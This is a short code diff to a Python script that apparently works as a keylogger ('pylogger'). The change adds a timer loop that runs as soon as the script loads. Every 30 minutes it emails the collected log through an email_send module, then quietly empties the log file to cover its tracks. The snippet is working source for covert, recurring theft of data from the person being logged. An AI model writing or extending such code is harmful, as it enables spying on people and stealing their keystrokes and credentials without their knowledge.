@@ -4,14 +4,18 @@ import data
 import threading
 import email_send
 
-t = threading.Timer(1800, email_threading)
+
 
 def email_threading():
 	email_send.send_data()
 	
-	if os.path.exists(expanduser(data.path)):
-  		os.remove(expanduser(data.path))
-	
+	if os.path.exists(os.path.expanduser(data.path)):
+  		open(os.path.expanduser(data.path), 'w').close()
+	t = threading.Timer(1800, email_threading)
+	t.start()
+
+email_threading()
+
 log_file = os.environ.get( 
 	'pylogger_file', 
 	os.path.expanduser(data.path) 
